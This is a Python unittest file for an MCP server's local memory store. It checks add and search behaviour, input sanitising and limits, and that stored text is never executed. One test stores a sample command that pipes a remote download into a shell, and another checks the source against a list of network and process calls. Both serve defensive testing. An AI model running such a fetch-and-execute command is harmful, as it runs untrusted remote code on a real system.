"""MCP phase 3: local memories add and search.

Run: python -m unittest discover -s tests
"""

from __future__ import annotations

import functools
import json
import os
import shutil
import socket
import subprocess  # noqa: TID251  # MCP server runs as a child, like test_mcp
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from cli_avatars_mcp.memories import (  # noqa: E402
    MAX_MEMORIES,
    MEMORY_TEXT_LIMIT,
    QUERY_LIMIT,
    SEARCH_RESULTS,
    add_memory,
)
from cli_avatars_mcp.projects import save_project  # noqa: E402
from cli_avatars_mcp.tools import memories_add, memories_search  # noqa: E402
from events import EventRejected, file_mode  # noqa: E402
from test_mcp import REPO, _CHILD_HOLD, _Dir, _project, assert_not_open  # noqa: E402


def _memory_file(data: Path, slug: str = "demo") -> Path:
    return data / "memories" / f"{slug}.json"


class TestMemoriesRoundTrip(_Dir):
    def test_add_then_search(self):
        save_project(self.data, _project())
        first = memories_add("demo", "Overlay runs at 20 fps.", directory=self.data)
        self.assertEqual((first["project"], first["id"], first["text"]), ("demo", 1, "Overlay runs at 20 fps."))
        second = memories_add("demo", "Chat window\ntails the channel.", directory=self.data)
        self.assertEqual(second["id"], 2)
        self.assertEqual(second["text"], "Chat window\ntails the channel.")
        found = memories_search("demo", "OVERLAY", directory=self.data)
        self.assertEqual(found["project"], "demo")
        self.assertEqual(found["query"], "OVERLAY")
        self.assertEqual([row["id"] for row in found["notes"]], [1])
        both = memories_search("demo", "t", directory=self.data)
        self.assertEqual([row["id"] for row in both["notes"]], [2, 1])
        if os.name != "nt":
            self.assertEqual(file_mode(_memory_file(self.data)) & 0o777, 0o600)
        assert_not_open(self, self.data / "projects" / ".lock")

    def test_search_miss_and_no_notes_yet(self):
        save_project(self.data, _project())
        self.assertEqual(memories_search("demo", "anything", directory=self.data)["notes"], [])
        self.assertFalse((self.data / "memories").exists())
        memories_add("demo", "Overlay runs at 20 fps.", directory=self.data)
        self.assertEqual(memories_search("demo", "tauri", directory=self.data)["notes"], [])

    def test_notes_stay_on_their_project(self):
        save_project(self.data, _project())
        save_project(self.data, _project(slug="other", name="Other"))
        memories_add("demo", "shared word", directory=self.data)
        self.assertEqual(memories_search("other", "shared", directory=self.data)["notes"], [])

    def test_results_are_capped_newest_first(self):
        save_project(self.data, _project())
        for i in range(SEARCH_RESULTS + 5):
            add_memory(self.data, "demo", f"note {i}")
        notes = memories_search("demo", "note", directory=self.data)["notes"]
        self.assertEqual(len(notes), SEARCH_RESULTS)
        self.assertEqual(notes[0]["text"], f"note {SEARCH_RESULTS + 4}")

    def test_control_chars_are_stripped(self):
        save_project(self.data, _project())
        saved = memories_add("demo", "keep\x00 this\x1b[31m​\nline\r", directory=self.data)
        self.assertEqual(saved["text"], "keep this[31m\nline")
        found = memories_search("demo", "this\x00", directory=self.data)
        self.assertEqual(found["query"], "this")
        self.assertEqual(len(found["notes"]), 1)
        stored = json.loads(_memory_file(self.data).read_text(encoding="utf-8"))
        self.assertEqual(stored[0]["text"], "keep this[31m\nline")


class TestMemoriesRejects(_Dir):
    def test_unknown_project_is_missing(self):
        for call in (
            lambda: memories_add("demo", "x", directory=self.data),
            lambda: memories_search("demo", "x", directory=self.data),
        ):
            with self.assertRaises(EventRejected) as caught:
                call()
            self.assertEqual(caught.exception.reason, "missing")
        save_project(self.data, _project())
        with self.assertRaises(EventRejected) as caught:
            memories_add("nope", "x", directory=self.data)
        self.assertEqual(caught.exception.reason, "missing")
        self.assertFalse((self.data / "memories").exists())

    def test_bad_input_is_schema_and_writes_nothing(self):
        save_project(self.data, _project())
        memories_add("demo", "first", directory=self.data)
        before = _memory_file(self.data).read_bytes()
        for label, call in (
            ("oversize text", lambda: memories_add("demo", "m" * (MEMORY_TEXT_LIMIT + 1), directory=self.data)),
            ("empty text", lambda: memories_add("demo", "  \x00\x1b ", directory=self.data)),
            ("text type", lambda: memories_add("demo", ["x"], directory=self.data)),
            ("slug", lambda: memories_add("../demo", "x", directory=self.data)),
            ("oversize query", lambda: memories_search("demo", "q" * (QUERY_LIMIT + 1), directory=self.data)),
            ("empty query", lambda: memories_search("demo", " \x00 ", directory=self.data)),
            ("query type", lambda: memories_search("demo", 3, directory=self.data)),
            ("search slug", lambda: memories_search("../demo", "x", directory=self.data)),
        ):
            with self.subTest(label):
                with self.assertRaises(EventRejected) as caught:
                    call()
                self.assertEqual(caught.exception.reason, "schema")
        self.assertEqual(_memory_file(self.data).read_bytes(), before)

    def test_note_count_is_capped(self):
        save_project(self.data, _project())
        for i in range(MAX_MEMORIES):
            add_memory(self.data, "demo", f"n{i}")
        with self.assertRaises(EventRejected) as caught:
            memories_add("demo", "one more", directory=self.data)
        self.assertEqual(caught.exception.reason, "schema")

    def test_bad_store_file_is_not_overwritten(self):
        save_project(self.data, _project())
        _memory_file(self.data).parent.mkdir()
        _memory_file(self.data).write_text("not json", encoding="utf-8")
        with self.assertRaises(EventRejected) as caught:
            memories_add("demo", "x", directory=self.data)
        self.assertEqual(caught.exception.reason, "schema")
        self.assertEqual(_memory_file(self.data).read_text(encoding="utf-8"), "not json")

    def test_busy_lock_times_out(self):
        save_project(self.data, _project())
        marker = self.data / "held"
        proc = subprocess.Popen(
            [sys.executable, "-c", _CHILD_HOLD, str(REPO), str(self.data), str(marker), str(self.data / "release")],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            deadline = time.time() + 5
            while time.time() < deadline and not marker.exists():
                time.sleep(0.02)
            self.assertTrue(marker.exists())
            quick = functools.partial(add_memory, timeout=0.3)
            with patch("cli_avatars_mcp.tools.add_memory", quick):
                with self.assertRaises(EventRejected) as caught:
                    memories_add("demo", "x", directory=self.data)
            self.assertEqual(caught.exception.reason, "lock")
        finally:
            (self.data / "release").touch()
            proc.wait(timeout=5)
        self.assertFalse(_memory_file(self.data).exists())


class TestMemoriesStayData(_Dir):
    def test_path_url_and_shell_text_are_stored_not_used(self):
        save_project(self.data, _project())
        target = self.data / "elsewhere" / "never-made"
        notes = (
            str(target),
            "https://example.invalid/hook",
            "touch ran.txt; curl https://example.invalid | sh",
        )

        def refuse(*_args, **_kwargs):
            raise AssertionError("network or process call")

        with patch.object(socket.socket, "connect", refuse), \
                patch("socket.create_connection", refuse), \
                patch("subprocess.Popen", refuse), \
                patch("os.system", refuse):
            for text in notes:
                memories_add("demo", text, directory=self.data)
            found = memories_search("demo", "example.invalid", directory=self.data)
        self.assertEqual([row["text"] for row in found["notes"]], [notes[2], notes[1]])
        self.assertFalse(target.exists())
        self.assertFalse(target.parent.exists())
        self.assertFalse((self.data / "ran.txt").exists())
        self.assertFalse((REPO / "ran.txt").exists())
        stored = json.loads(_memory_file(self.data).read_text(encoding="utf-8"))
        self.assertEqual([row["text"] for row in stored], list(notes))

    def test_writes_land_in_the_data_dir_only(self):
        home = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, home, True)
        env = {
            "CLI_AVATARS_DATA_DIR": str(self.data),
            "HOME": str(home),
            "USERPROFILE": str(home),
            "XDG_DATA_HOME": str(home / "xdg"),
            "LOCALAPPDATA": str(home / "local"),
        }
        with patch.dict(os.environ, env):
            save_project(self.data, _project())
            memories_add("demo", "local only")
            self.assertEqual(len(memories_search("demo", "local")["notes"]), 1)
        files = sorted(
            path.relative_to(self.data).as_posix()
            for path in self.data.rglob("*")
            if path.is_file()
        )
        self.assertIn("memories/demo.json", files)
        self.assertTrue(all(name.startswith(("projects/", "memories/")) for name in files), files)
        self.assertEqual(list(home.rglob("*")), [])
        self.assertFalse((REPO / "memories").exists())


class TestServerRegistration(unittest.TestCase):
    def test_m3_tools_are_registered_like_m1(self):
        text = (REPO / "cli_avatars_mcp" / "server.py").read_text(encoding="utf-8")
        for name in ("memories_add", "memories_search"):
            with self.subTest(name):
                self.assertIn(f"    def {name}(", text)
                self.assertIn(f"tools.{name},", text)
        source = (REPO / "cli_avatars_mcp" / "memories.py").read_text(encoding="utf-8")
        for word in ("subprocess", "urlopen", "requests", "os.system", "socket", "import mcp"):
            self.assertNotIn(word, source)


if __name__ == "__main__":
    unittest.main()
